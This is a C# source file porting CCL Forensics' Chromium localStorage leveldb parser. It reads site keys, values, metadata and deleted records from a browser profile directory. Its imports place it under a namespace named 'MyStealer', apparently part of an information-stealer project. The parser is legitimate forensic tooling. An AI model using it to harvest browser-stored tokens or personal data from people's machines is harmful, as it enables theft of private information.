// 
// Copyright 2021, CCL Forensics
// Permission is hereby granted, free of charge, to any person obtaining a copy of
// this software and associated documentation files (the "Software"), to deal in
// the Software without restriction, including without limitation the rights to
// use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies
// of the Software, and to permit persons to whom the Software is furnished to do
// so, subject to the following conditions:
// 
// The above copyright notice and this permission notice shall be included in all
// copies or substantial portions of the Software.
// 
// THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
// IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
// FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
// AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
// LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
// OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
// SOFTWARE.
// 

using System.Collections.Generic;
using System;
using System.Text;
using MyStealer.Handler.Chromium;
using System.IO;
using static CclLevelDb;
using MyStealer.Handler.Chromium.LevelDb;
using System.Linq;

/// <summary>
/// Ported from ccl_leveldb.py using pytocs 2.0.0-3150cbcd42
/// Check https://github.com/cclgroupltd/ccl_chrome_indexeddb for the original source
/// 
/// Version: 0.3
/// Description: Module for reading the Chromium leveldb localstorage format
/// Contact: Alex Caithness
/// </summary>
public static class CclChromiumLocalStorage
{

    /// <summary>
    /// See: https://source.chromium.org/chromium/chromium/src/+/main:components/services/storage/dom_storage/local_storage_impl.cc
    /// Meta keys:
    ///   Key = ""META:"" + storage_key(the host)
    ///   Value = protobuff: 1=timestamp(varint); 2=size in bytes(varint)
    /// Record keys:
    ///   Key = ""_"" + storage_key + """ + "\\" +@"x0"" + script_key
    ///   Value = record_value
    /// </summary>
    static CclChromiumLocalStorage()
    {
    }

    public static byte[] _META_PREFIX = new byte[] { (byte)'M', (byte)'E', (byte)'T', (byte)'A', (byte)':' };

    public static byte _RECORD_KEY_PREFIX = (byte)'_';

    public static string EIGHT_BIT_ENCODING = "iso-8859-1";

    // todo: remove this proxy func
    public static DateTime from_chrome_timestamp(int microseconds) => ChromiumTimeStamp.ToUtc(microseconds);

    // 
    //     decodes a type-prefixed string - prefix of: 0=utf-16-le; 1=an extended ascii codepage (likely dependant on locale)
    //     :param raw: raw prefixed-string data
    //     :return: decoded string
    //     
    public static string decode_string(byte[] raw)
    {
        var prefix = raw[0];
        if (prefix == 0)
            return Encoding.Unicode.GetString(raw, 1, raw.Length - 1);
        else if (prefix == 1)
            return Encoding.Default.GetString(raw, 1, raw.Length - 1);
        else
            throw new ArgumentException("Unexpected prefix: " + prefix);
    }

    public class StorageEntry
    {
        public string storage_key;

        public ulong leveldb_seq_number;
    }

    public class StorageMetadata : StorageEntry
    {
        public DateTime timestamp;

        public int size_in_bytes;

        public StorageMetadata(string storage_key, DateTime timestamp, int size_in_bytes, ulong leveldb_seq_number)
        {
            this.storage_key = storage_key;
            this.timestamp = timestamp;
            this.size_in_bytes = size_in_bytes;
            this.leveldb_seq_number = leveldb_seq_number;
        }

        public static StorageMetadata from_protobuff(string storage_key, byte[] data, ulong seq)
        {
            using (var stream = new MemoryStream(data))
            {
                // This is a simple protobuff, so we'll read it directly, but with checks, rather than add a dependency
                var ts_tag = CclLevelDb.read_le_varint(stream);
                if ((ts_tag & 0x07) != 0 || ts_tag >> 3 != 1)
                    throw new Exception("Unexpected tag when reading StorageMetadata from protobuff");

                var timestamp = from_chrome_timestamp(CclLevelDb.read_le_varint(stream));
                var size_tag = CclLevelDb.read_le_varint(stream);
                if ((size_tag & 0x07) != 0 || size_tag >> 3 != 2)
                    throw new Exception("Unexpected tag when reading StorageMetadata from protobuff");

                var size = CclLevelDb.read_le_varint(stream);
                return new StorageMetadata(storage_key, timestamp, size, seq);
            }
        }
    }

    public class LocalStorageRecord : StorageEntry
    {
        public string script_key;

        public string value;

        public bool is_live;

        public LocalStorageRecord(string storage_key, string script_key, string value, ulong leveldb_seq_number, bool is_live)
        {
            this.storage_key = storage_key;
            this.script_key = script_key;
            this.value = value;
            this.leveldb_seq_number = leveldb_seq_number;
            this.is_live = is_live;
        }
    }

    public class LocalStorageBatch
    {

        public ulong _end;

        public StorageMetadata _meta;

        public LocalStorageBatch(StorageMetadata meta, ulong end_seq)
        {
            _meta = meta;
            _end = end_seq;
        }

        public string storage_key
        {
            get
            {
                return _meta.storage_key;
            }
        }

        public DateTime timestamp
        {
            get
            {
                return _meta.timestamp;
            }
        }

        public ulong start
        {
            get
            {
                return _meta.leveldb_seq_number;
            }
        }

        public ulong end
        {
            get
            {
                return _end;
            }
        }

        public override string ToString() => $"{nameof(LocalStorageBatch)}{{storage_key={storage_key}, timestamp={timestamp}, start={start}, end={end}}}";
    }

    public class LocalStoreDb : IDisposable
    {

        public ISet<string> _all_storage_keys;

        public List<ulong> _batch_starts;

        public Dictionary<ulong, LocalStorageBatch> _batches;

        public List<StorageEntry> _flat_items;

        public RawLevelDb _ldb;

        public Dictionary<string, Dictionary<string, Dictionary<ulong, LocalStorageRecord>>> _records;

        public Dictionary<string, Dictionary<ulong, StorageMetadata>> _storage_details;

        public LocalStoreDb(string in_dir)
        {
            string storage_key;
            string value = null;

            if (!File.GetAttributes(in_dir).HasFlag(FileAttributes.Directory))
                throw new IOException("Input directory is not a directory");

            _ldb = new RawLevelDb(in_dir);
            _storage_details = new Dictionary<string, Dictionary<ulong, StorageMetadata>>();
            _flat_items = new List<StorageEntry>();
            _records = new Dictionary<string, Dictionary<string, Dictionary<ulong, LocalStorageRecord>>>();

            foreach (var record in _ldb.iterate_records_raw())
            {
                if (record.user_key.StartsWith(_META_PREFIX) && record.state == KeyState.Live)
                {
                    var metaLen = _META_PREFIX.Length;
                    storage_key = Encoding.GetEncoding(EIGHT_BIT_ENCODING).GetString(record.user_key, metaLen, record.user_key.Length - metaLen);
                    if (!_storage_details.ContainsKey(storage_key))
                        _storage_details[storage_key] = new Dictionary<ulong, StorageMetadata>();

                    var metadata = StorageMetadata.from_protobuff(storage_key, record.value, record.seq);
                    _storage_details[storage_key][record.seq] = metadata;
                    _flat_items.Add(metadata);
                }
                else if (record.user_key[0] == _RECORD_KEY_PREFIX)
                {
                    // We include deleted records here because we need them to build batches
                    (var storage_key_raw, var script_key_raw) = record.user_key.Split(0x00);
                    storage_key = Encoding.GetEncoding(EIGHT_BIT_ENCODING).GetString(storage_key_raw, 1, storage_key_raw.Length - 1);

                    var script_key = decode_string(script_key_raw);
                    try
                    {
                        value = record.state == CclLevelDb.KeyState.Live ? decode_string(record.value) : null;
                    }
                    catch (DecoderFallbackException)
                    {
                        // Some sites play games to test the browser's capabilities like encoding half of a surrogate pair
                        Console.WriteLine("Error decoding record value at seq no {record.seq}; {storage_key} {script_key}:  {record.value}");
                        continue;
                    }
                    if (!_records.ContainsKey(storage_key))
                        _records[storage_key] = new Dictionary<string, Dictionary<ulong, LocalStorageRecord>>();
                    if (!_records[storage_key].ContainsKey(script_key))
                        _records[storage_key][script_key] = new Dictionary<ulong, LocalStorageRecord>();
                    var ls_record = new LocalStorageRecord(storage_key, script_key, value, record.seq, record.state == CclLevelDb.KeyState.Live);
                    _records[storage_key][script_key][record.seq] = ls_record;
                    _flat_items.Add(ls_record);
                }
            }
            //this._storage_details = types.MappingProxyType(this._storage_details);
            //this._records = types.MappingProxyType(this._records);
            _all_storage_keys = new HashSet<string>(_storage_details.Keys.Concat(_records.Keys));
            _flat_items.Sort((a, b) => a.leveldb_seq_number.CompareTo(b.leveldb_seq_number));

            // organise batches - this is made complex and slow by having to account for missing/deleted data
            // we're looking for a StorageMetadata followed by sequential (in terms of seq number) LocalStorageRecords
            // with the same storage key. Everything that falls within that chain can safely be considered a batch.
            // Any break in sequence numbers or storage key is a fail and can't be considered part of a batch.
            _batches = new Dictionary<ulong, LocalStorageBatch>();
            StorageMetadata current_meta = null;
            var current_end = 0UL;
            foreach (var item in _flat_items)
            {
                // pre-sorted
                if (item is LocalStorageRecord)
                {
                    if (current_meta is null)
                    {
                        // no currently valid metadata so we can't attribute this record to anything
                        continue;
                    }
                    else if (item.leveldb_seq_number - current_end != 1 || item.storage_key != current_meta.storage_key)
                    {
                        // this record breaks a chain, so bundle up what we have and clear everything out
                        _batches[current_meta.leveldb_seq_number] = new LocalStorageBatch(current_meta, current_end);
                        current_meta = null;
                        current_end = 0;
                    }
                    else
                    {
                        // contiguous and right storage key, include in the current chain
                        current_end = item.leveldb_seq_number;
                    }
                }
                else if (item is StorageMetadata)
                {
                    if (current_meta != null)
                    {
                        // this record breaks a chain, so bundle up what we have, set new start
                        _batches[current_meta.leveldb_seq_number] = new LocalStorageBatch(current_meta, current_end);
                    }
                    current_meta = (StorageMetadata)item;
                    current_end = item.leveldb_seq_number;
                }
                else
                {
                    throw new Exception("Unknown item: " + item);
                }
            }
            if (current_meta != null)
                _batches[current_meta.leveldb_seq_number] = new LocalStorageBatch(current_meta, current_end);

            _batch_starts = _batches.Keys.OrderBy(x => x).ToList();
        }

        public virtual IEnumerable<string> iter_storage_keys()
        {
            foreach (var entry in _storage_details.Keys)
                yield return entry;
        }

        public virtual bool contains_storage_key(string storage_key)
        {
            return _all_storage_keys.Contains(storage_key);
        }

        public virtual IEnumerable<string> iter_script_keys(string storage_key)
        {
            if (!_all_storage_keys.Contains(storage_key))
            {
                throw new KeyNotFoundException(storage_key);
            }
            if (!_records.ContainsKey(storage_key))
            {
                //throw new StopIteration();
                yield break;
            }

            foreach (var entry in _records[storage_key].Keys)
                yield return entry;
        }

        public virtual bool contains_script_key(string storage_key, string script_key)
            => _records.TryGetValue(storage_key, out var entry) && entry.ContainsKey(script_key);

        // 
        //         Finds the batch that a record with the given sequence number belongs to
        //         :param seq: leveldb sequence id
        //         :return: the batch containing the given sequence number or None if no batch contains it
        //         
        public virtual LocalStorageBatch find_batch(ulong seq)
        {
            var bin = _batch_starts.BinarySearch(seq, Comparer<ulong>.Default);
            if (bin < 0)
                bin = ~bin;
            var i = bin - 1; // bisect.bisect_left(_batch_starts, seq) - 1
            if (i < 0)
                return null;

            var start = _batch_starts[i];
            var batch = _batches[start];
            if (batch.start <= seq && seq <= batch.end)
                return batch;
            else
                return null;
        }

        // 
        //         :param include_deletions: if True, records related to deletions will be included
        //         (these will have None as values).
        //         :return: iterable of LocalStorageRecords
        //         
        public virtual IEnumerable<LocalStorageRecord> iter_all_records(bool include_deletions = false)
        {
            foreach (var scriptDict in _records)
            {
                foreach (var seqDict in scriptDict.Value)
                {
                    foreach (var value in seqDict.Value.Values)
                    {
                        if (value.is_live || include_deletions)
                            yield return value;
                    }
                }
            }
        }

        // 
        //         :param storage_key: storage key (host) for the records
        //         :param include_deletions: if True, records related to deletions will be included
        //         (these will have None as values).
        //         :return: iterable of LocalStorageRecords
        //         
        public virtual IEnumerable<LocalStorageRecord> iter_records_for_storage_key(string storage_key, bool include_deletions = false)
        {
            if (!this.contains_storage_key(storage_key))
                throw new KeyNotFoundException(storage_key);

            foreach (var record in _records[storage_key])
            {
                foreach (var value in record.Value.Values)
                {
                    if (value.is_live || include_deletions)
                        yield return value;
                }
            }
        }

        // 
        //         :param storage_key: storage key (host) for the records
        //         :param script_key: script defined key for the records
        //         :return: iterable of LocalStorageRecords
        //         
        public virtual IEnumerable<LocalStorageRecord> iter_records_for_script_key(string storage_key, string script_key, bool include_deletions = false)
        {
            if (!this.contains_script_key(storage_key, script_key))
                throw new KeyNotFoundException("storage_key: " + storage_key + " script_key: " + script_key);

            foreach (var value in _records[storage_key][script_key].Values)
            {
                if (value.is_live || include_deletions)
                    yield return value;
            }
        }

        // 
        //         :return: iterable of StorageMetaData
        //         
        public virtual IEnumerable<StorageMetadata> iter_metadata()
        {
            foreach (var meta in _flat_items)
            {
                if (meta is StorageMetadata)
                    yield return (StorageMetadata)meta;
            }
        }

        // 
        //         :param storage_key: storage key (host) for the metadata
        //         :return: iterable of StorageMetadata
        //         
        public virtual IEnumerable<StorageMetadata> iter_metadata_for_storage_key(string storage_key)
        {
            if (!_all_storage_keys.Contains(storage_key))
                throw new KeyNotFoundException(storage_key);

            if (!_storage_details.ContainsKey(storage_key))
                yield break;

            foreach (var meta in _storage_details[storage_key].Values)
                yield return meta;
        }

        public virtual IEnumerable<KeyValuePair<ulong, LocalStorageBatch>> iter_batches()
        {
            foreach (var batch in _batches)
                yield return batch;
        }

        public void Dispose() => ((IDisposable)_ldb).Dispose();
    }
}
